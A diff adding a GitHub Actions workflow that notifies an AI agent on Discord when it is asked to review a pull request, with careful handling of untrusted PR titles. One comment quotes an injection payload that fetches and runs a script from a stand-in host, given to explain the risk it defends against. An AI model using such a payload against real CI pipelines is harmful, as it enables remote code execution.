@@ -1,0 +1,84 @@
+name: Notify agent of review requests
+
+# Fires when a reviewer is added to a PR. GitHub sends one event per reviewer,
+# with the reviewer in `requested_reviewer` (or `requested_team` for a team
+# request, which leaves `requested_reviewer` null and the job's `if` false).
+on:
+  pull_request:
+    types: [review_requested]
+
+# Nothing here reads the repository — no checkout, no API calls. The job only
+# POSTs to an external webhook, so it needs no token scopes at all.
+permissions: {}
+
+jobs:
+  notify:
+    # One event fires per requested reviewer, so without this the agent would
+    # be pinged for reviews assigned to someone else.
+    if: github.event.requested_reviewer.login == 'agentsmaug'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Post review request to Discord
+        env:
+          WEBHOOK: ${{ secrets.DISCORD_AGENT_WEBHOOK_URL }}
+          # Everything below is interpolated into the environment, never into
+          # the `run:` script. A PR title is attacker-controlled text, and
+          # `${{ }}` expanded inside a shell script would let a title like
+          # `"; curl evil.sh | sh; #` execute as part of that script.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          REPO: ${{ github.repository }}
+          SENDER: ${{ github.event.sender.login }}
+          # The bot's Discord user ID. A literal <@id> in `content` is what
+          # trips the plugin's mention gate — an embed cannot carry one, which
+          # is why this posts a plain message rather than using Discord's
+          # /github webhook endpoint.
+          AGENT_ID: "1533202140863008938"
+        run: |
+          set -euo pipefail
+
+          if [ -z "${WEBHOOK}" ]; then
+            echo "::error::DISCORD_AGENT_WEBHOOK_URL is unset — the agent was not notified." >&2
+            echo "Fork PRs do not receive secrets; internal branches should." >&2
+            exit 1
+          fi
+
+          # jq builds the JSON so a title containing quotes, backslashes or
+          # newlines cannot corrupt the payload. Discord caps `content` at
+          # 2000 characters; the title is the only unbounded field.
+          payload="$(jq -n \
+            --arg agent   "$AGENT_ID" \
+            --arg repo    "$REPO" \
+            --arg num     "$PR_NUMBER" \
+            --arg title   "$PR_TITLE" \
+            --arg url     "$PR_URL" \
+            --arg author  "$PR_AUTHOR" \
+            --arg sender  "$SENDER" \
+            '{
+               username: "github-review-bot",
+               content: (
+                 "<@" + $agent + "> review requested by **" + $sender + "**\n" +
+                 $repo + "#" + $num + " — " + ($title | .[0:300]) + "\n" +
+                 "opened by " + $author + "\n" + $url
+               )
+             }')"
+
+          status="$(curl -sS --fail-with-body \
+            -o /tmp/discord-response.txt -w '%{http_code}' \
+            -X POST "$WEBHOOK" \
+            -H 'Content-Type: application/json' \
+            --data-binary "$payload")" || {
+              echo "::error::Discord rejected the notification." >&2
+              cat /tmp/discord-response.txt >&2 || true
+              exit 1
+            }
+
+          # Discord returns 204 No Content on success.
+          if [ "$status" != "204" ]; then
+            echo "::error::Unexpected Discord status $status" >&2
+            cat /tmp/discord-response.txt >&2 || true
+            exit 1
+          fi
+          echo "Notified the agent about $REPO#$PR_NUMBER (HTTP $status)."
